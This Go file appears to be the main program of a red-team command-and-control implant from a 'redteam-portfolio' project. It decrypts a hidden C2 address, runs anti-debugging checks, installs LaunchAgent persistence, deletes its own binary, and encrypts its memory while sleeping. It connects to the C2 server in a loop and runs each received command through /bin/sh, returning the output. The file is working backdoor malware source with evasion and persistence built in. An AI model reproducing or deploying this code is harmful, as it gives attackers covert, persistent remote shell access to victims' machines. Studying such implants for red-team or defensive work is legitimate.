package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"redteam-portfolio/pkg/c2"
	"redteam-portfolio/pkg/comms"
	"redteam-portfolio/pkg/crypto"
	"redteam-portfolio/pkg/evasion"
	"redteam-portfolio/pkg/persistence"
	"runtime"
	"time"
)

const (
	encC2Addr = "9ec78be1f870e4a4dd37b2b183cad9bb36d0410f858e96230c1e39674e264a6a5cda8699f12577776cccf77bfe6a"
	encKey    = "c9e4737ac9b481b70809fc372d13ef97a921c5fea7bfd3773b10b8213986bef3"
	minJitter = 8
	maxJitter = 15
)

func main() {
	fmt.Printf("[IMPLANT] Starting on %s/%s\n", runtime.GOOS, runtime.GOARCH)

	evasion.AntiDebug()

	c2Address, err := crypto.DecryptString(encC2Addr, encKey)
	if err != nil {
		fmt.Println("[IMPLANT] Decryption failed")
		return
	}

	// Install LaunchAgent persistence BEFORE deleting the original binary
	if err := persistence.Install(); err != nil {
		fmt.Printf("[IMPLANT] Persistence skipped: %v\n", err)
	} else {
		fmt.Println("[IMPLANT] Persistence installed")
	}

	// Remove original binary from disk
	if len(os.Args) > 0 {
		os.Remove(os.Args[0])
		fmt.Println("[IMPLANT] Removed from disk")
	}

	memKey := evasion.DeriveKey([]byte(encKey))
	secBuf, err := evasion.NewSecureBuffer(256)
	if err != nil {
		fmt.Println("[IMPLANT] Secure alloc failed")
		return
	}
	defer secBuf.Wipe()
	secBuf.Write([]byte(c2Address))

	for {
		addr := secBuf.String()
		session(addr)

		jitter := time.Duration(minJitter+rand.Intn(maxJitter-minJitter)) * time.Second
		fmt.Printf("[IMPLANT] Sleeping %v (locked)\n", jitter)
		if err := secBuf.Sleep(memKey, jitter); err != nil {
			fmt.Printf("[IMPLANT] Sleep error: %v\n", err)
		}
	}
}

func session(c2Address string) {
	raw, err := c2.DialRaw(c2Address)
	if err != nil {
		return
	}
	defer raw.Close()

	sess, err := comms.NewSecureConn(raw, encKey)
	if err != nil {
		return
	}
	defer sess.Close()

	fmt.Println("[IMPLANT] Connected to C2 (encrypted)")

	for {
		if err := sess.WriteMessage([]byte("ready")); err != nil {
			fmt.Println("[IMPLANT] Connection lost")
			return
		}

		msg, err := sess.ReadMessage()
		if err != nil {
			fmt.Println("[IMPLANT] Connection lost")
			return
		}

		cmdLine := string(msg)
		if cmdLine == "" {
			continue
		}

		out, err := exec.Command("/bin/sh", "-c", cmdLine).CombinedOutput()
		if err != nil {
			sess.WriteMessage([]byte(fmt.Sprintf("error: %s\n%s", err.Error(), out)))
			continue
		}

		sess.WriteMessage(out)
	}
}
